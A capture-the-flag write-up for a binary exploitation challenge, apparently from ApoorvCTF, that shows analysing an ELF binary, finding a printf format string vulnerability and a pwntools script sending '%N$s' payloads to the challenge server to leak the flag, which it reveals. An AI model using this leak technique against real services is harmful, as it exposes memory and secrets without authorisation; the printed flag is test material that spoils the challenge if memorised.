# !Kogarashi Café - The Secret Blend  

**Category:** Binary Exploitation  

A mysterious café menu hides more than just coffee choices. Let's extract the secret blend.  

---

### Challenge  

**Provided File:** `secret_blend`  

---

## Overview  

1. **Analyzing the Binary**  
   - First, check the binary type:  
     ```sh
     file secret_blend
     ```
     - Output: `ELF 32-bit LSB executable, Intel 80386, dynamically linked, not stripped`  
   - Run `strings` to find hints:  
     ```sh
     strings secret_blend  
     ```
     - Found: `Barista: 'The special blend is missing...`  

2. **Disassembling the Binary**  
   - Using `objdump` to generate a disassembly file:  
     ```sh
     objdump -d secret_blend > disassembly.txt  
     ```
   - Loaded the binary into **Ghidra** and **Binary Ninja** for further analysis.  

3. **Finding the Vulnerability**  
   - Observed that the binary takes user input and prints output using `printf`.  
   - Potential **format string vulnerability** detected, allowing memory leakage.  

---

## Steps to Exploit  

1. **Identify Format String Vulnerability**  
   - Since the program prints user input using `printf`, we can exploit it to leak stack values.  
   - Using `%x` and `%s` to extract hidden values.  

2. **Determine the Correct Offset**  
   - To find the flag, we cycle through offsets until the flag appears in the output.  
   - We automate this with a Python script using `pwntools`.  

---

## Exploit Script  

```python
#!/usr/bin/env python3
from pwn import *

def test_offset(offset):
    try:
        # Create a new connection for each attempt
        p = remote("chals1.apoorvctf.xyz", 3003)
        # Wait for the prompt
        p.recvuntil(b"What will you have?")
        # Craft the payload
        payload = f"%{offset}$s".encode()
        p.sendline(payload)
        # Receive response
        response = p.recvall(timeout=2)
        p.close()
        return response
    except EOFError:
        return b""

def main():
    flag = None
    # Try offsets 1 through 15
    for offset in range(1, 16):
        response = test_offset(offset)
        print(f"Offset {offset}: {response}")
        if b"flag{" in response:
            flag = response
            log.success("Flag found: " + flag.decode(errors="ignore"))
            break
    if flag is None:
        log.error("Flag not found. Adjust the offset range if needed.")

if __name__ == "__main__":
    main()
```

---

## Flag  

After running the script, we extract:  
**`apoorvctf{Th3_M3nu_L34ks_M0re_Than_It_Sh0uld}`**  
